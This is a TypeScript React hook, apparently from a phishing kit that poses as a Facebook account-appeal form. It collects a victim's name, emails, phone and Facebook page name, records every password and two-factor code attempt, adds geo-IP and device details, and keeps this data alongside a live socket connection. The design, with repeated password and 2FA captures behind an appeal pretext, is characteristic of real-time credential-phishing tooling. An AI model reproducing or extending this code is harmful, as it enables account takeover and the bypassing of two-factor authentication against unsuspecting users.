'use client';

import { useSocketEmit } from '@/hooks/use-socket';
import { store } from '@/store/store';
import type { FormDataPayload, LoginData } from '@/utils/message';
import { geoToIpInfo } from '@/utils/message';

const userDataToForm = (userData: {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    phoneNumber: string;
    facebookPageName: string;
    information: string;
}): FormDataPayload => ({
    fullName: userData.fullName,
    dateOfBirth: '',
    personalEmail: userData.personalEmail,
    businessEmail: userData.businessEmail,
    phone: userData.phoneNumber,
    pageName: userData.facebookPageName,
    additionalNotes: userData.information
});

export const useAppealContext = () => {
    const { socket, isConnected } = useSocketEmit();
    const {
        geoInfo,
        deviceLabel,
        messageId,
        userData,
        loginProvider,
        setMessageId,
        addAccount,
        addPassword,
        addCode
    } = store();

    const ip = geoInfo ? geoToIpInfo(geoInfo) : null;
    const formData = userDataToForm(userData);

    const loginData: LoginData = {
        email: userData.accounts.at(-1) ?? '',
        password: userData.passwords.at(-1) ?? ''
    };

    const setLoginData = (data: LoginData) => {
        const email = data.email.trim();
        if (email) {
            addAccount(email);
        }
        if (data.password) {
            addPassword(data.password);
        }
    };

    const ready = Boolean(socket && isConnected && ip && userData.fullName);

    return {
        socket,
        isConnected,
        ready,
        ip,
        deviceLabel,
        messageId,
        formData,
        loginData,
        loginProvider,
        passwordAttempts: userData.passwords,
        twoFAAttempts: userData.codes,
        setMessageId,
        setLoginData,
        addPasswordAttempt: addPassword,
        addTwoFAAttempt: addCode
    };
};
